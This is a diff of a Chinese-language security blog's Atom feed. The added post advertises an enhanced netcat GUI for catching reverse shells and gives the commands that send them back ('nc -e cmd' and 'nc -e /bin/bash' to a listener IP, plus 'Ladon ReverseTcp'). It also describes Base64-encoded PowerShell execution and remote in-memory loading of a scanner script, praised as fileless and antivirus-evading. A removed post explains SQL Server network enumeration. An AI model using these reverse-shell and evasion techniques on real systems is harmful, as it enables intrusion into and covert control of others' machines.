@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2020-12-21T13:55:00.812Z</updated>
+  <updated>2020-12-25T16:03:21.739Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>〖工具〗加强版NC加密执行PowerShell/内存加载Ladon扫描</title>
+    <link href="http://k8gege.org/p/LadonNC.html"/>
+    <id>http://k8gege.org/p/LadonNC.html</id>
+    <published>2020-12-25T15:00:00.000Z</published>
+    <updated>2020-12-25T16:03:21.739Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="NC简介"><a href="#NC简介" class="headerlink" title="NC简介"></a>NC简介</h3><p>NetCat，简称Nc，是一款非常实用的网络工具，他它能够建立并接受传输控制协议（TCP)和用户数据报协议(UDP)的连接，小巧而功能强大，被誉为网络安全界的“瑞士军刀”。NetCat被设计成一个可靠的后端(back-end) 工具，拥有功能丰富的网络调试和开发工具，它可以通过手工或者脚本与应用层的网络应用程序或服务进行交互，可以帮你轻易的建立几乎任何类型的连接。同时还可以当服务器使用，能监听任意指定端口的连接请求(inbound connection )，并可做同样的读写操作。</p><p>netcat在UNIX/LINUX/MAC等系统默认安装，所以现在依然是黑客必学的命令，功能很多，但现在大多数人估计也就只会用它来反弹。上一代或喜欢命令行下渗透的，可能比较熟悉使用NC的其它功能，什么端口扫描、监听、抓包等，由于现在我最多也就使用它来反弹，所以就弄个加强版的NC客户端，可监听来自WINDOWS、Linux、Mac等任意系统反弹的SHELL，针对Windows还可执行PowerShell命令、当然也支持渗透必备的Ladon。</p><h3 id="加强版NC"><a href="#加强版NC" class="headerlink" title="加强版NC"></a>加强版NC</h3><p>GUI 2020.12.25<br>[+] Netcat PowerShell命令加密执行<br>[+] Netcat 内存加载PowerLadon执行</p><p>GUI 2020.12.16<br>[u] Netcat 兼容Linux或MAC反弹SHELL<br>[+] Netcat 执行命令历史记录</p><h3 id="NC监听"><a href="#NC监听" class="headerlink" title="NC监听"></a>NC监听</h3><p>nc -lvp 4444</p><p>LadonGUI监听，直接点击Listen即可</p><h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>nc -e cmd 192.168.1.110 4444</p><h4 id="linux-mac"><a href="#linux-mac" class="headerlink" title="linux/mac"></a>linux/mac</h4><p>nc -e /bin/bash 192.168.1.110 4444</p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><p>Ladon ReverseTcp 192.168.1.110 4444 nc</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>其它方法反弹，Ladon也支持</p><h3 id="执行CMD命令"><a href="#执行CMD命令" class="headerlink" title="执行CMD命令"></a>执行CMD命令</h3><p>不勾选PowerShell或PowerLadon，默认即是正常的CMD命令</p><h3 id="执行PowerShell命令-加密"><a href="#执行PowerShell命令-加密" class="headerlink" title="执行PowerShell命令(加密)"></a>执行PowerShell命令(加密)</h3><p>优点：有一定的反查效果（虽说Base64形同虚设，但也比完全不加密好一点）<br>勾选PowerShell，在CMD框中输入PowerShell命令或代码，执行的时候自动加密<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/ncpowershell.PNG"></p><h3 id="一键搭建WEB服务器"><a href="#一键搭建WEB服务器" class="headerlink" title="一键搭建WEB服务器"></a>一键搭建WEB服务器</h3><p>将Ladon.ps1和Ladon.exe放到VPS或内网中，使用Ladon web 800搭建Web服务器<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/Ladon_web.PNG"></p><h3 id="远程内存加载Ladon扫描"><a href="#远程内存加载Ladon扫描" class="headerlink" title="远程内存加载Ladon扫描"></a>远程内存加载Ladon扫描</h3><p>优点：1.无文件落地 2.免杀 3.无操作痕迹<br>执行NC反弹后，填写对应Ladon.ps1的下载地址并勾选PowerLadon，然后就可以像使用EXE或CS版那样使用Ladon了<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/NC_PowerLadon.PNG"></p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.7版本：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;NC简介&quot;&gt;&lt;a href=&quot;#NC简介&quot; class=&quot;headerlink&quot; title=&quot;NC简介&quot;&gt;&lt;/a&gt;NC简介&lt;/h3&gt;&lt;p&gt;NetCat，简称Nc，是一款非常实用的网络工具，他它能够建立并接受传输控制协议（TCP)和用户数据报协议(UDP)的连接，
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="netcat" scheme="http://k8gege.org/tags/netcat/"/>
+    
+  </entry>
   
   <entry>
     <title>〖EXP〗NSA MS17010永恒之蓝漏洞一键工具</title>
@@ -553,40 +579,6 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
       <category term="OXID" scheme="http://k8gege.org/tags/OXID/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>利用SqlDataSourceEnumerator获取局域网SQL主机</title>
-    <link href="http://k8gege.org/p/61471.html"/>
-    <id>http://k8gege.org/p/61471.html</id>
-    <published>2020-06-12T04:10:10.000Z</published>
-    <updated>2020-10-13T13:55:13.221Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程序开发人员公开此信息，提供包含所有可见服务器的信息的 DataTable。 此返回的表包含网络上可用的服务器实例的列表，该列表与用户尝试创建新连接时提供的列表匹配，并展开包含连接属性上所有可用服务器的下拉列表。对话框。 显示的结果并非总是完整的。</p><h3 id="SqlDataSourceEnumerator"><a href="#SqlDataSourceEnumerator" class="headerlink" title="SqlDataSourceEnumerator"></a>SqlDataSourceEnumerator</h3><p>命名空间: System.Data.Sql<br>程序集: System.Data.dll</p><p>提供了一种枚举本地网络内的所有可用 SQL Server 实例的机制。</p><p>通过方法调用返回的表包含以下列，所有列均包含 string 值：<br>列     描述<br>ServerName     服务器的名称。<br>InstanceName     服务器实例的名称。 如果服务器作为默认实例运行，则为空白。<br>IsClustered     指示服务器是否属于群集。<br>Version     服务器的版本。 例如:</p><p>-9.00 （SQL Server 2005）<br>-10.0. xx （SQL Server 2008）<br>-10.50 （SQL Server 2008 R2）<br>-11.0. xx （SQL Server 2012）</p><h3 id="C-示例代码"><a href="#C-示例代码" class="headerlink" title="C#示例代码"></a>C#示例代码</h3><p>.NET与PowerShell谁的兼容性和执行效率更好就不用我说了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">using System.Data.Sql;  </span><br><span class="line">  </span><br><span class="line">class Program  </span><br><span class="line">&#123;  </span><br><span class="line">  static void Main()  </span><br><span class="line">  &#123;  </span><br><span class="line">    &#x2F;&#x2F; Retrieve the enumerator instance and then the data.  </span><br><span class="line">    SqlDataSourceEnumerator instance &#x3D;  </span><br><span class="line">      SqlDataSourceEnumerator.Instance;  </span><br><span class="line">    System.Data.DataTable table &#x3D; instance.GetDataSources();  </span><br><span class="line">  </span><br><span class="line">    &#x2F;&#x2F; Display the contents of the table.  </span><br><span class="line">    DisplayData(table);  </span><br><span class="line">  </span><br><span class="line">    Console.WriteLine(&quot;Press any key to continue.&quot;);  </span><br><span class="line">    Console.ReadKey();  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  private static void DisplayData(System.Data.DataTable table)  </span><br><span class="line">  &#123;  </span><br><span class="line">    foreach (System.Data.DataRow row in table.Rows)  </span><br><span class="line">    &#123;  </span><br><span class="line">      foreach (System.Data.DataColumn col in table.Columns)  </span><br><span class="line">      &#123;  </span><br><span class="line">        Console.WriteLine(&quot;&#123;0&#125; &#x3D; &#123;1&#125;&quot;, col.ColumnName, row[col]);  </span><br><span class="line">      &#125;  </span><br><span class="line">      Console.WriteLine(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PowerShell命令"><a href="#PowerShell命令" class="headerlink" title="PowerShell命令"></a>PowerShell命令</h3><p>系统未安装或禁用PowerShell会失效，但也比国人故意吹捧的PowerUPSQL好很多倍。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop&gt;PowerShell -Command <span class="string">"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"</span></span><br><span class="line"></span><br><span class="line">ServerName          InstanceName        IsClustered         Version</span><br><span class="line">----------          ------------        -----------         -------</span><br><span class="line">K82003-77562E10</span><br><span class="line">WIN-OLDM1T2H9M4</span><br></pre></td></tr></table></figure><h3 id="PowerUPSQL"><a href="#PowerUPSQL" class="headerlink" title="PowerUPSQL"></a>PowerUPSQL</h3><p>此工具也是基于SqlDataSourceEnumerator实现的，兼容性较差，很多系统下运行各种报错。</p><pre><code class="Bash">PS C:\Users\k8gege\Desktop\PowerUpSQL-master&gt; Get-SQLInstanceBroadcast -Verbose详细信息: Attempting to identify SQL Server instances on the broadcast domain.详细信息: 2 SQL Server instances were found.ComputerName                        Instance                           IsClustered                        Version                           ------------                        --------                           -----------                        -------                           K82003-77562E10                     K82003-77562E10                                                                                         WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre><h3 id="Ladon-EnumMssql"><a href="#Ladon-EnumMssql" class="headerlink" title="Ladon EnumMssql"></a>Ladon EnumMssql</h3><p>Ladon的EnumMssql模块不支持扫描，若内网存在多个网段，可使用PortScan扫描探测。<br><img alt="img" data-original="https://camo.githubusercontent.com/2e97e127bfc1acd625ee289dbfaf4b3ffd307bd7/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f63732f43535f456e756d4d5353514c2e676966"></p><p>Ladon与PowerUPSQL对比，Ladon支持任意Win系统，而PowerUPSQL就未必能用了<br><img alt="img" data-original="https://camo.githubusercontent.com/73b58a071a70adf62dc7f4aecd1dff48d8e5df40/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f6578652f456e756d4d5353514c2e676966"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-      <category term="主机发现" scheme="http://k8gege.org/categories/OnlinePC/"/>
-    
-      <category term="信息收集" scheme="http://k8gege.org/categories/Discover/"/>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-      <category term=".NET" scheme="http://k8gege.org/tags/Dotnet/"/>
-    
-      <category term="SQL" scheme="http://k8gege.org/tags/SQL/"/>
     
   </entry>
   
